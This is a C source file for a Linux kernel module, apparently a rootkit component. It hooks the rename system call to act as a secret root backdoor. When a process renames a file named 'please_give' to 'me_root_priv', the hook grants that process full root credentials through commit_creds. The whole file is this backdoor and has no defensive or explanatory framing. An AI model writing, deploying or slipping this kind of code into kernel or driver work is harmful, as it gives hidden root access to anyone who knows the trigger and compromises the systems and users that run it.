#include <linux/cred.h>
#include <linux/uaccess.h>
#include "hooking.h"
#include "root_access.h"

const char *PLEASE_GIVE = "please_give";
const char *ME_ROOT_PRIV = "me_root_priv";
const char *HERE_YOU_GO = "here_you_go";

t_syscall old_rename;
static asmlinkage long new_rename(const struct pt_regs *pt_regs);

// hook the rename syscall
void init_root_access(void) {
	old_rename = get_syscall(__NR_rename);
	add_hook((unsigned long) new_rename, __NR_rename);
}

// new rename syscall, if the old name is "please_give" and the new name is "me_root_prov", calling process will be granted root privilages and the file will be name "here_you_go"
static asmlinkage long new_rename(const struct pt_regs *pt_regs) {
	char *arg1 = (char *) pt_regs->di;
	char *arg2 = (char *) pt_regs->si;

	if (!strcmp(arg1, PLEASE_GIVE) && !strcmp(arg2, ME_ROOT_PRIV)) {
		copy_to_user(arg2, HERE_YOU_GO, strlen(HERE_YOU_GO) + 1);	// change file name
		commit_creds(prepare_kernel_cred(NULL));					// grant root privilages
	}

	return old_rename(pt_regs);
}
